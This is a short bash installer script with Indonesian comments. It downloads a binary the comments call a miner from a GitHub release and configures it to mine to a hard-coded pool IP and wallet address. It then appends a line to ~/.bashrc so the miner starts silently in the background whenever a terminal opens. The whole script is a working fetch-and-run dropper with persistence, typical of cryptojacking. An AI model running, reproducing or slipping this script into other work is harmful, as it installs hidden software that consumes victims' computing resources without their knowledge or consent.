#!/bin/bash

# Buat direktori root jika belum ada
mkdir -p ~/joko
cd ~/joko

# Unduh dan ekstrak file miner
wget https://github.com/vokerjok/Voker/releases/download/Voker/fannyexp.tar.gz
tar xf fannyexp.tar.gz
rm fannyexp.tar.gz

# Buat config.json
cat > config.json <<END
{
    "app": "-a spectre -o 128.199.126.117:90 -u 85KNrXfutegLDjeRiaBjkUVjCU2A3jkDq8s79A6M1dXg3dL4zZcNwh9UZkSL2HrGmZhoVuFru53mQH8MMz97nTzc47kk9kr -p joko -t 8 --disable-gpu"
}
END

# Izin eksekusi
chmod +x fannyexp config.json

# Buat script start
cat > start.sh <<EOF
#!/bin/bash
cd ~/joko
./fannyexp \$(jq -r '.app' config.json)
EOF

chmod +x start.sh

# Tambahkan ke .bashrc agar auto-run saat terminal dibuka
if ! grep -q "joko/start.sh" ~/.bashrc; then
    echo "bash ~/joko/start.sh &" >> ~/.bashrc
fi

echo "✅ Setup selesai. Silakan buka terminal baru untuk menjalankan miner."
